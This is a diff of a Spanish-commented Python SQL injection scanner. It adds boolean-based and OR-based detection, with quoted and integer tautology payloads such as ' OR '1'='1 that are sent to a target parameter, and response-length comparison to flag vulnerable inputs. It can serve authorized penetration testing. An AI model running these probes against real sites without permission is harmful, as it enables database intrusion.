@@ -153,26 +153,119 @@ def realizar_peticion(url, params):
 
 
 
-def check_for_sqli(target_url, param, extra_params=None):
+def probar_boolean_basado(target_url, param, params_base, tipo_inyeccion="simple"):
     """
-    Genera un error SQLi para comprobar vulnerabilidad.
+    Detecta SQL Injection Boolean-Based/OR-Based probando condiciones TRUE/FALSE.
     
     :param target_url: Target URL
-    :param param: Comma-separated vulnerable parameters
+    :param param: Parámetro vulnerable
+    :param params_base: Parámetros base (sin inyección)
+    :param tipo_inyeccion: 'simple' ('), 'doble' ("), 'entero' (sin comillas)
+    :return: (vulnerable: bool, tipo_deteccion: str, info: dict)
+    """
+    
+    # Definir prefijos y sufijos según tipo de inyección
+    tipos = {
+        'simple': {
+            'base': "1'",
+            'true': "1' AND '1'='1",
+            'false': "1' AND '1'='2",
+            'or': "1' OR '1'='1"
+        },
+        'doble': {
+            'base': '1"',
+            'true': '1" AND "1"="1',
+            'false': '1" AND "1"="2',
+            'or': '1" OR "1"="1'
+        },
+        'entero': {
+            'base': '1',
+            'true': '1 AND 1=1',
+            'false': '1 AND 1=0',
+            'or': '1 OR 1=1'
+        }
+    }
+    
+    if tipo_inyeccion not in tipos:
+        return False, None, {}
+    
+    payloads = tipos[tipo_inyeccion]
+    
+    # Obtener respuesta normal
+    params_normal = params_base.copy()
+    params_normal[param] = payloads['base']
+    respuesta_normal = realizar_peticion(target_url, params_normal)
+    len_normal = len(respuesta_normal)
+    
+    # Respuesta TRUE
+    params_true = params_base.copy()
+    params_true[param] = payloads['true']
+    respuesta_true = realizar_peticion(target_url, params_true)
+    len_true = len(respuesta_true)
+    
+    # Respuesta FALSE
+    params_false = params_base.copy()
+    params_false[param] = payloads['false']
+    respuesta_false = realizar_peticion(target_url, params_false)
+    len_false = len(respuesta_false)
+    
+    # Respuesta OR
+    params_or = params_base.copy()
+    params_or[param] = payloads['or']
+    respuesta_or = realizar_peticion(target_url, params_or)
+    len_or = len(respuesta_or)
+    
+    # Analizar diferencias
+    diferencia_boolean = abs(len_true - len_false)
+    aumento_or = ((len_or - len_normal) / len_normal * 100) if len_normal > 0 else 0
+    
+    info = {
+        'tipo': tipo_inyeccion,
+        'len_normal': len_normal,
+        'len_true': len_true,
+        'len_false': len_false,
+        'len_or': len_or,
+        'diferencia': diferencia_boolean,
+        'aumento_or_pct': aumento_or
+    }
+    
+    # Detectar si es vulnerable
+    # Boolean-Based: diferencia significativa entre TRUE y FALSE
+    if diferencia_boolean > max(len_normal * 0.05, 10):
+        return True, "Boolean-Based", info
+    
+    # OR-Based: respuesta OR es significativamente más grande
+    if len_or > len_normal * 1.05:
+        return True, "OR-Based", info
+    
+    return False, None, info
+
+
+def check_for_sqli(target_url, param, extra_params=None):
+    """
+    Detecta SQL Injection usando múltiples técnicas:
+    1. Error-Based: Busca mensajes de error SQL
+    2. Boolean-Based: Compara respuestas de condiciones TRUE y FALSE
+    3. OR-Based: Detecta respuestas alteradas con OR conditions
+    Soporta: comilla simple ('), comilla doble ("), entero (sin comillas)
+    
+    :param target_url: Target URL
+    :param param: Parámetro vulnerable
+    :param extra_params: Parámetros adicionales
+    :return: True si vulnerable, False si no
     """
 
-    payload_error = "1'" # Payload simple para generar error SQL
-    params = extra_params.copy() if extra_params else {}
+    params_base = extra_params.copy() if extra_params else {}
+    
+    print(f"[+] Probando parámetro: {param}")
+    
+    # DETECCIÓN ERROR-BASED 
+    print("  [*] Intentando Error-Based...")
+    payload_error = "1'"
+    params = params_base.copy()
     params[param] = payload_error
 
-    print(f"[+] Probando parámetro: {param}")
-    respuesta = realizar_peticion(target_url, params)
-    
-    # Debug: imprimir respuesta HTML
-    print("\n[DEBUG] Respuesta HTML:")
-    print("-" * 50)
-    print(respuesta)
-    print("-" * 50)
+    respuesta_error = realizar_peticion(target_url, params)
     
     # Buscar indicios de error SQL en la respuesta
     errores_sql = [
@@ -185,16 +278,35 @@ def check_for_sqli(target_url, param, extra_params=None):
         "mysql_num_rows",
         "pg_query",
         "syntax error",
-        "mysql",
         "unclosed quotation"
     ]
 
     for error in errores_sql:
-        if error.lower() in respuesta.lower():
-            print(f"  ¡VULNERABLE! Error detectado.")
+        if error.lower() in respuesta_error.lower():
+            print(f"    ¡VULNERABLE! Error SQL detectado: {error}")
             return True
     
-    print("  No se detectó vulnerabilidad evidente (Error Based).")
+    # DETECCIÓN BOOLEAN-BASED / OR-BASED (todos los tipos de inyección)
+    print("  [*] Intentando Boolean-Based / OR-Based...")
+    
+    for tipo in ['simple', 'doble', 'entero']:
+        vulnerable, metodo, info = probar_boolean_basado(target_url, param, params_base, tipo)
+        
+        if vulnerable:
+            print(f"    ¡VULNERABLE! {metodo} detectado ({tipo})")
+            print(f"      Tamaño normal: {info['len_normal']} bytes")
+            print(f"      Tamaño TRUE: {info['len_true']} bytes")
+            print(f"      Tamaño FALSE: {info['len_false']} bytes")
+            
+            if metodo == "OR-Based":
+                print(f"      Tamaño OR: {info['len_or']} bytes")
+                print(f"      Aumento: {info['aumento_or_pct']:.1f}%")
+            else:
+                print(f"      Diferencia: {info['diferencia']} bytes")
+            
+            return True
+    
+    print("  No se detectó vulnerabilidad evidente.")
     return False
 
 def obtener_num_columnas(url, param_vulnerable, otros_params):
